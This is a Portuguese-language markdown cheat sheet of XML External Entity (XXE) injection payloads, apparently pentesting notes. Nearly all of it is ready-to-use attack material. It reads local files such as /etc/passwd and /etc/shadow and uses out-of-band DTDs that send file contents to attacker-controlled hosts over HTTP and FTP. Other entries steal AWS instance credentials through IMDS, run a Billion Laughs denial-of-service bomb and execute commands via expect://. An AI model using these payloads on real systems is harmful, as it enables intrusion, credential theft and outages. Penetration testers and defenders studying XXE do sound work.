# XML External Entity
:hamburger: A vulnerabilidade XXE (XML External Entity) ocorre quando a aplicação processa dados XML de maneira inadequada, permitindo que um atacante insira entidades externas no XML.

Payload 
```
## Formulário de Login 

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [<!ENTITY foo SYSTEM "file:///etc/passwd" >]>
     	  <login> 
        <username>&foo;</username>
        <password>1234</password>         
        </login>
        
## PHP Wripper 

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [<!ENTITY foo SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/3/.arquivo.php" >]>
     	  <login> 
     	  <username>&foo;</username>
          <password>1234</password>         
          </login>
```

### XXE to SMB  
```
<!DOCTYPE test [ <!ENTITY req SYSTEM "\\[IP]/teste"> ]>
```
### XXE to HTTP
```
<!DOCTYPE test [ <!ENTITY req SYSTEM "http://[IP]/teste"> ]>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://[IP]> %xxe; ]>
```
### XXE Out-of-Band 1
```
## Payload inserido na requisição

<?xml version="1.0"?>
<!DOCTYPE test [
<!ELEMENT test ANY >
<!ENTITY % req SYSTEM "http://[IP-ATACANTE]:443/file.dtd">
%req;
%param1;
]>
<test>&exfil;</test>

## Arquivo File DTD que fica no servidor-atacante

[+] cria o arquivo file.dtd com o código abaixo
[+] armazena o arquivo no servidor-atacante

<!ENTITY % data SYSTEM "file:///C:\windows\win.ini">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[IP-ATACANTE]/?%start;%data;%end;'>">
```

### XXE Out-of-Band 2
```
### Payload inserido na requisição

<!DOCTYPE XXE OOB [
          <!ENTITY % EvilDTD SYSTEM "http://[URL-SERVIDOR-ATACANTE]/file.dtd" >
          ## Aqui a ordem das enttities tem que ser respeitado
          %EvilDTD; ## Chama a entity da requisição 
          %Load00BEnt; ## Chama a entity no arquivo file.dtd
          %OOB; ## Chama a entity que faz referência ao servidor-atacante
]>

### Payload para o arquivo DTD no servidor-atacante

### A primeira Entity é para o recurso que deseja acessar no servidor/aplicação alvo
<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/fstab">

### A segunda Entity é o servidor-atacante que vai receber o request para a primeira Entity e registrar
<!ENTITY % Load00Ent "<ENTITY &#x25; OOB SYSTEM 'http://[URL]/?p=%resource;'> ">
```
### XXE Out-of-Band 3
```
### Payload na requisição

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://[IP-Atacante]:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>

### Payload para o arquivo evil.dtd
Aplicação vai receber o request para o arquivo evil.dtd, e em seguida faz um request para o back-end na porta 8888

<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

### XXE Out-of-Band 4
```
## Payload na requisição
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

## Payload no arquivo DTD
## DTD file

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>">
%eval;
%test;
```

### XXE Out-of-Band 5 - Error Message
```
# Exemplo 1
# DTD file

<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % notvalid "<!ENTITY &#x25; test SYSTEM 'file:///invalid/%file;'>">
%notvalid;
%test;

# Payload na requisição 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
```
# Exemplo 2 - Java
# Payload na requisição 

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>

# Arquivo DTD

<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
```
```
# Exemplo 3 
# Payload na requisição 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
  %one;
  %two;
  %four;
]>

# Arquivo DTD 

<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
(Se for necessário fazer o encode do símbolo %, use &#x25;)
```

### XML Bombs (Billion Laughs Attack)
```
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  <!ENTITY lol0 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  <!ENTITY lol1 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  <!ENTITY lol2 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<login>
   <username>&lol2</username>
   <password>1234</password>
</login>
```

### XXE to SSRF na AWS
Captura metadados da instancia vulnerável que possui a versão 1 do serviços IMDS
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

### XXE na imagem .svg
Use Content-Type: image/svg+xml
```
# Exemplo 1

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
```
# Exemplo 2

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```
```
# Exemplo 3
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
### OOB via SVG
xxe.svg
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```
xxe.xml
```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

## XInclude para ler arquivo interno
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE SOAP
```
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

### XXE com PHP Wrapper
```
# DATA

!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
```
# Base64 Encode

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

### XXE to LFI
```
# Exemplo 1

<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```
```
# Exemplo 2

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```
```
# Exemplo 3 

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```
### XXE to UTF7
```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

### XXE Out-of-Band com FTP
```
# Exemplo 1
# Payload na requisição

<!DOCTYPE data [
<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendftp.dtd">
%remote;
%send;
]>
<data>4</data>

# File stored on http://publicServer.com/parameterEntity_sendftp.dtd

<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
%param1;
```
```
# Exemplo 2 
# Payload na requisição 

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil;
]>

# Arquivo DTD

<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">
```

### Outros payloads Out-of-Band
```
# Payload na requisição 
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

# Arquivo DTD

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
```
```
# Payload na requisição 

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>

## Arquivo DTD

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
```
```
# Payload na requisição

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
%dtd;
]>
<root>&all;</root>

# Arquivo DTD
<!ENTITY all "%start;%stuff;%end;">
```
<p>:orange_book: Payloads: 
<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</p>
<p>https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf</p>
<p>:orange_book: Blind XXE exemplos: https://portswigger.net/web-security/xxe/blind</p>
<p>:orange_book: XXE Learning: https://gosecure.github.io/xxe-workshop/#0</p>

